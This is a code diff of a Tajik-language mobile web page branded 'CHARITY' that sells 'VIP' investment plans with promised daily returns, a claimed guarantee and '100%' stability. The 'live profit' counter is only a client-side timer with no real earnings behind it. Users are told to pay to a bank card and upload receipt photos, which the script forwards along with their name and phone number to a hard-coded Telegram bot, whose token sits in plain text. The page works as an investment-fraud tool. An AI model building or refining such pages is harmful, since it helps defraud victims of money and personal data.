@@ -5,125 +5,207 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CHARITY | Helping Hands</title>
     <style>
-        :root { --gold: #ffcc00; --dark: #0b1120; --card: #1e293b; --green: #00ff88; --blue: #3b82f6; }
-        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: var(--dark); color: white; }
-        .page { display: none; padding: 20px; padding-bottom: 100px; animation: fadeIn 0.4s; }
+        :root { --gold: #ffcc00; --dark: #070b14; --card: #151c2c; --green: #00ff88; --text-gray: #94a3b8; }
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; background: var(--dark); color: white; overflow-x: hidden; }
+        
+        .page { display: none; padding: 20px; padding-bottom: 100px; animation: slideUp 0.3s ease-out; }
         .active-page { display: block; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
 
-        /* VIP Cards */
-        .vip-card { background: var(--card); border-radius: 20px; margin-bottom: 20px; border: 1px solid #334155; overflow: hidden; }
-        .vip-header { background: var(--gold); color: black; padding: 12px 20px; font-weight: bold; display: flex; justify-content: space-between; }
-        .vip-info { padding: 15px; font-size: 14px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .btn-gold { background: linear-gradient(45deg, var(--gold), #ffaa00); color: black; padding: 12px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; }
+        /* Дизайни кортҳо */
+        .glass-card { background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid #2d3748; margin-bottom: 20px; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5); }
+        .btn-main { background: linear-gradient(45deg, var(--gold), #ffaa00); color: black; padding: 15px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.2s; }
+        .btn-main:active { transform: scale(0.98); }
 
+        /* VIP Buttons Style */
+        .vip-item { display: flex; justify-content: space-between; align-items: center; background: #1e293b; padding: 20px; border-radius: 15px; margin-bottom: 15px; border-left: 4px solid var(--gold); cursor: pointer; }
+        .vip-item h3 { margin: 0; color: var(--gold); }
+        
         /* Navigation */
-        .nav { position: fixed; bottom: 0; width: 100%; background: #0f172a; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #334155; }
-        .nav-item { color: #94a3b8; text-align: center; font-size: 11px; cursor: pointer; }
-        .active-nav { color: var(--gold); }
+        .nav { position: fixed; bottom: 0; width: 100%; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #1e293b; z-index: 1000; }
+        .nav-item { color: var(--text-gray); text-align: center; font-size: 10px; cursor: pointer; flex: 1; }
+        .nav-item i { font-size: 20px; display: block; margin-bottom: 4px; }
+        .active-nav { color: var(--gold); font-weight: bold; }
 
-        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #2d3748; background: #0f172a; color: white; box-sizing: border-box; }
+        .badge { background: var(--gold); color: black; padding: 2px 8px; border-radius: 5px; font-size: 12px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div id="page-reg" class="page active-page">
-    <div style="text-align: center; padding-top: 50px;">
-        <h1 style="color: var(--gold);">CHARITY</h1>
-        <p>Хуш омадед ба система</p>
-        <input type="text" id="reg-name" placeholder="Номи шумо">
-        <input type="tel" id="reg-phone" placeholder="Телефон">
-        <button class="btn-gold" onclick="register()">ВОРИД ШУДАН</button>
+<div id="page-reg" class="page">
+    <div style="text-align: center; margin-top: 60px;">
+        <img src="https://i.ibb.co/LzNfS6P/charity-logo.png" style="width: 120px; border-radius: 50%; box-shadow: 0 0 20px var(--gold);">
+        <h1 style="color: var(--gold); letter-spacing: 2px; margin-top: 20px;">CHARITY</h1>
+        <p style="color: var(--text-gray);">Барои ворид шудан маълумотро пур кунед</p>
+        <div class="glass-card">
+            <input type="text" id="reg-name" placeholder="Номи шумо">
+            <input type="tel" id="reg-phone" placeholder="Рақами телефон (9XXXXXXXX)">
+            <button class="btn-main" onclick="register()">ВОРИД ШУДАН</button>
+        </div>
     </div>
 </div>
 
 <div id="page-home" class="page">
-    <h2>Баланси шумо 🚀</h2>
-    <div style="background: var(--card); padding: 20px; border-radius: 20px; text-align: center; border: 1px solid var(--gold);">
-        <p>Фоидаи LIVE:</p>
-        <h1 id="live-profit" style="color: var(--green);">0.0000</h1>
-        <p id="active-status" style="font-size: 12px; color: #94a3b8;">Нақша фаъол нест</p>
+    <div class="glass-card" style="border-color: var(--gold);">
+        <h2 style="margin-top:0">Эътимод ва Кафолат 🤝</h2>
+        <p style="line-height: 1.6; color: #cbd5e1;">Мо ба шумо кафолати <b>1-солаи</b> фаъолияти боэътимодро медиҳем. Маблағҳои хайриявии шумо таҳти назорати қатъӣ қарор доранд ва фоидаи шумо ҳар сония илова мешавад.</p>
+        <div style="display: flex; gap: 10px; margin-top: 15px;">
+            <div style="flex:1; background: #064e3b; padding: 10px; border-radius: 10px; text-align: center;">
+                <span style="display:block; font-size: 12px;">Устуворӣ</span>
+                <b style="color: var(--green);">100%</b>
+            </div>
+            <div style="flex:1; background: #1e3a8a; padding: 10px; border-radius: 10px; text-align: center;">
+                <span style="display:block; font-size: 12px;">Дастгирӣ</span>
+                <b>24/7</b>
+            </div>
+        </div>
     </div>
-    
-    <div style="margin-top:20px; padding: 15px; background: #16213e; border-radius: 15px; border: 1px dashed var(--gold);">
-        <p style="font-size: 13px;">Корти Миллӣ барои пардохт:</p>
-        <div style="background: #000; padding: 10px; border-radius: 8px; text-align: center;">4444 5555 6666 7777</div>
-        <p style="font-size: 12px; margin-top: 10px;">Чекро интихоб кунед:</p>
-        <input type="file" id="check-file" accept="image/*">
-        <button class="btn-gold" onclick="sendToTelegram()">ФИРИСТОДАНИ ЧЕК</button>
+
+    <div class="glass-card" style="text-align: center;">
+        <span style="color: var(--text-gray); font-size: 14px;">Фоидаи ҷории шумо (LIVE):</span>
+        <h1 id="live-profit" style="font-size: 42px; margin: 10px 0; color: var(--green);">0.0000</h1>
+        <div id="active-status" style="color: var(--gold); font-size: 13px; font-weight: bold;">Нақшаи фаъол нест</div>
+    </div>
+
+    <div class="glass-card">
+        <h3>Пур кардани Баланс</h3>
+        <p style="font-size: 13px; color: var(--text-gray);">Маблағро ба корти зерин гузаронед ва чекро фиристед:</p>
+        <div style="background: #000; padding: 15px; border-radius: 12px; text-align: center; font-size: 18px; border: 1px dashed var(--gold); letter-spacing: 1px;">4444 5555 6666 7777</div>
+        <p style="font-size: 12px; margin-top: 15px;">Интихоби чек (сурат):</p>
+        <input type="file" id="check-file" accept="image/*" style="padding: 10px;">
+        <button class="btn-main" onclick="sendToTelegram()">ФИРИСТОДАН БА АДМИН</button>
     </div>
 </div>
 
 <div id="page-products" class="page">
-    <h2 style="color: var(--gold);">Нақшаҳои Сармоягузорӣ</h2>
+    <h2 style="color: var(--gold);">Тугмаҳои Даромад</h2>
     <div id="vip-list"></div>
 </div>
 
+<div id="page-details" class="page">
+    <button onclick="showPage('products')" style="background:none; border:none; color:var(--gold); font-size:16px; margin-bottom:20px;">← Бозгашт</button>
+    <div id="details-content"></div>
+</div>
+
+<div id="page-profile" class="page">
+    <div class="glass-card" style="text-align: center;">
+        <div id="user-avatar" style="width: 80px; height: 80px; background: var(--gold); color: black; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; margin: 0 auto 15px;">U</div>
+        <h2 id="profile-name" style="margin:0">Корбар</h2>
+        <p id="profile-phone" style="color: var(--text-gray); margin: 5px 0 20px;">900 00 00 00</p>
+        <button class="btn-main" style="background: #24292f; color: white;" onclick="window.location.href='https://t.me/charity_tj'">💬 ГУРӮҲИ ТЕЛЕГРАМ</button>
+        <br><br>
+        <button onclick="logout()" style="color: #ef4444; background: none; border: none; cursor: pointer;">ХУРУҶ АЗ АККАУНТ</button>
+    </div>
+</div>
+
 <nav id="nav-bar" class="nav" style="display:none;">
-    <div class="nav-item" onclick="showPage('home')">🏠<br>Асосӣ</div>
-    <div class="nav-item" onclick="showPage('products')">🔘<br>Тугмаҳо</div>
+    <div class="nav-item active-nav" onclick="tabClick(this, 'home')">🏠<br>Асосӣ</div>
+    <div class="nav-item" onclick="tabClick(this, 'products')">🔘<br>Тугмаҳо</div>
+    <div class="nav-item" onclick="tabClick(this, 'profile')">👤<br>Профил</div>
 </nav>
 
 <script>
     const BOT_TOKEN = "8693263483:AAH1pHi68Akw2rnGMvEvc4_sMlW070PJc1Q";
-    const CHAT_ID = "6365005853"; // Эзоҳ: Ин ID-и шумо аст (@ad_min_boy)
+    const CHAT_ID = "6365005853";
 
     const vips = [
-        { name: 'Тугмаи 1', price: 120, day: 3 },
-        { name: 'Тугмаи 2', price: 260, day: 6 }
+        { id: 1, name: 'Тугмаи 1', price: 120, day: 3, desc: 'Ин нақша барои навкорон беҳтарин аст. Бо маблағи кам даромади доимиро оғоз кунед.' },
+        { id: 2, name: 'Тугмаи 2', price: 260, day: 6, desc: 'Нақшаи миёна бо фоидаи дучанд. Суръати афзоиши маблағ тезтар аст.' },
+        { id: 3, name: 'Тугмаи 3', price: 470, day: 15, desc: 'Нақшаи касбӣ барои онҳое, ки мехоҳанд фоидаи калон ба даст оранд.' }
     ];
 
-    let user = { name: "", phone: "" };
-    let liveVal = 0;
-    let activePlan = null;
+    let user = JSON.parse(localStorage.getItem('charity_user'));
+    let activePlan = JSON.parse(localStorage.getItem('charity_plan'));
+    let liveVal = parseFloat(localStorage.getItem('charity_balance')) || 0;
+
+    window.onload = () => {
+        if(user) {
+            startApp();
+        } else {
+            showPage('reg');
+        }
+    };
 
     function register() {
-        user.name = document.getElementById('reg-name').value;
-        user.phone = document.getElementById('reg-phone').value;
-        if(user.name && user.phone) {
-            document.getElementById('page-reg').style.display='none';
-            document.getElementById('nav-bar').style.display='flex';
-            showPage('home');
-            renderVIPs();
-            setInterval(() => {
-                if(activePlan) {
-                    liveVal += (activePlan.day / 86400);
-                    document.getElementById('live-profit').innerText = liveVal.toFixed(4);
-                }
-            }, 1000);
-        }
+        const name = document.getElementById('reg-name').value;
+        const phone = document.getElementById('reg-phone').value;
+        if(name.length > 2 && phone.length > 5) {
+            user = { name, phone };
+            localStorage.setItem('charity_user', JSON.stringify(user));
+            startApp();
+        } else { alert("Маълумотро дуруст пур кунед!"); }
     }
 
-    function showPage(p) {
-        document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
-        document.getElementById('page-'+p).classList.add('active-page');
+    function startApp() {
+        document.getElementById('page-reg').style.display = 'none';
+        document.getElementById('nav-bar').style.display = 'flex';
+        document.getElementById('profile-name').innerText = user.name;
+        document.getElementById('profile-phone').innerText = user.phone;
+        document.getElementById('user-avatar').innerText = user.name[0].toUpperCase();
+        showPage('home');
+        renderVIPs();
+        
+        setInterval(() => {
+            if(activePlan) {
+                liveVal += (activePlan.day / 86400);
+                document.getElementById('live-profit').innerText = liveVal.toFixed(4);
+                localStorage.setItem('charity_balance', liveVal);
+            }
+        }, 1000);
     }
 
     function renderVIPs() {
         const list = document.getElementById('vip-list');
+        list.innerHTML = '';
         vips.forEach(v => {
             list.innerHTML += `
-                <div class="vip-card">
-                    <div class="vip-header"><span>${v.name}</span> <span>${v.price} TJS</span></div>
-                    <div class="vip-info">
-                        <div>Ҳар рӯз: <b style="color:var(--green)">${v.day} TJS</b></div>
-                        <div>10 рӯз: <b style="color:var(--green)">${v.day * 10} TJS</b></div>
-                        <div>Як моҳ: <b style="color:var(--green)">${v.day * 30} TJS</b></div>
+                <div class="vip-item" onclick="showDetails(${v.id})">
+                    <div>
+                        <h3>${v.name}</h3>
+                        <span style="color:var(--text-gray)">Нарх: ${v.price} TJS</span>
                     </div>
-                    <button class="btn-gold" style="border-radius:0" onclick="activate('${v.name}', ${v.day})">ФАЪОЛ КАРДАН</button>
+                    <span class="badge">ДИДАН</span>
                 </div>`;
         });
     }
 
-    function activate(name, day) {
-        activePlan = { name, day };
-        document.getElementById('active-status').innerText = "Фаъол: " + name;
-        alert(name + " интихоб шуд! Акнун пардохт кунед ва чекро фиристед.");
+    function showDetails(id) {
+        const v = vips.find(x => x.id === id);
+        const content = document.getElementById('details-content');
+        content.innerHTML = `
+            <div class="glass-card" style="border-top: 5px solid var(--gold);">
+                <h1 style="color:var(--gold)">${v.name}</h1>
+                <p style="color:var(--text-gray); line-height:1.5">${v.desc}</p>
+                <hr style="border:0; border-top:1px solid #2d3748; margin:20px 0;">
+                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px; margin-bottom:20px;">
+                    <div>📅 Ҳар рӯз:<br><b style="color:var(--green)">${v.day} TJS</b></div>
+                    <div>📊 10 рӯз:<br><b style="color:var(--green)">${v.day * 10} TJS</b></div>
+                    <div>💰 Як моҳ:<br><b style="color:var(--green)">${v.day * 30} TJS</b></div>
+                    <div>🏦 Нарх:<br><b>${v.price} TJS</b></div>
+                </div>
+                <button class="btn-main" onclick="activatePlan(${v.id})">ИНТИХОБ ВА ФАЪОЛ КАРДАН</button>
+            </div>
+        `;
+        showPage('details');
+    }
+
+    function activatePlan(id) {
+        const v = vips.find(x => x.id === id);
+        activePlan = v;
+        localStorage.setItem('charity_plan', JSON.stringify(v));
+        document.getElementById('active-status').innerText = "Фаъол: " + v.name;
+        showPage('home');
+        alert("Нақшаи " + v.name + " интихоб шуд. Лутфан чеки пардохтро фиристед.");
     }
 
     async function sendToTelegram() {
         const fileInput = document.getElementById('check-file');
-        if (!fileInput.files[0]) return alert("Чекро бор кунед!");
+        if (!fileInput.files[0]) return alert("Лутфан аввал сурати чекро бор кунед!");
+
+        const btn = document.querySelector('button[onclick="sendToTelegram()"]');
+        btn.innerText = "ФИРИСТОДА ИСТОДААСТ...";
+        btn.disabled = true;
 
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
@@ -131,9 +213,31 @@
         formData.append("caption", `📥 ЧЕКИ НАВ!\n👤 Ном: ${user.name}\n📞 Тел: ${user.phone}\n💳 Нақша: ${activePlan ? activePlan.name : 'Интихоб нашуда'}`);
 
         try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-            alert("Чек фиристода шуд! Админ тасдиқ мекунад.");
-        } catch (e) { alert("Хатогӣ!"); }
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+            if(res.ok) {
+                alert("✅ Чеки шумо фиристода шуд! Админ пас аз тафтиш баланси шуморо тасдиқ мекунад.");
+                btn.innerText = "ФИРИСТОДА ШУД ✅";
+            } else { alert("Хатогӣ дар бот! Ботро дар Телеграм START кардед?"); btn.disabled = false; }
+        } catch (e) { alert("Хатогии шабака!"); btn.disabled = false; }
+    }
+
+    function showPage(p) {
+        document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
+        document.getElementById('page-'+p).classList.add('active-page');
+        window.scrollTo(0,0);
+    }
+
+    function tabClick(el, p) {
+        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active-nav'));
+        el.classList.add('active-nav');
+        showPage(p);
+    }
+
+    function logout() {
+        if(confirm("Оё мехоҳед аз аккаунт бароед?")) {
+            localStorage.clear();
+            location.reload();
+        }
     }
 </script>
 </body>
